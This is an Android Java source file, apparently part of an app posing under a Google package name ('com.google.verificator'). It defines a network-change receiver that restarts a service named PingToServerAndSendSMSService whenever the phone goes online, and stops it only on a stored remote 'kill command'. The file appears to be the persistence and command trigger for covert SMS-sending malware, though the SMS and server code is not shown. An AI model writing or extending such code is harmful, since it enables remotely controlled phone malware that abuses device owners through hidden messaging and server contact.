package com.google.verificator;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class NetworkChangedReceiver extends BroadcastReceiver {

    private Context mContext;


    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        AppGlobals.isInternetWorking();
        try {
            if (AppGlobals.isNetworkAvailable(context)) {
                AppGlobals.hasInternet = true;
                if (AppGlobals.isKillCommandTrue() && PingToServerAndSendSMSService.getInstance() != null) {
                    PingToServerAndSendSMSService.getInstance().stopSelf();
                    AppGlobals.serviceRunning(false);
                    AppGlobals.saveKillCommand(false);

                } else {
                    if (!AppGlobals.isServiceRunning()) {
                        Log.e("onReceive", "Online Connect Intenet......... ");
                        Intent myService = new Intent(mContext, PingToServerAndSendSMSService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            mContext.startForegroundService(myService);
                        } else {
                            mContext.startService(myService);
                        }
                    }
                }
            } else {
                AppGlobals.hasInternet = false;
                Log.e("onReceive", "Conectivity Failure !!! ");
            }
        } catch (NullPointerException e) {
            e.printStackTrace();
        }

    }
}
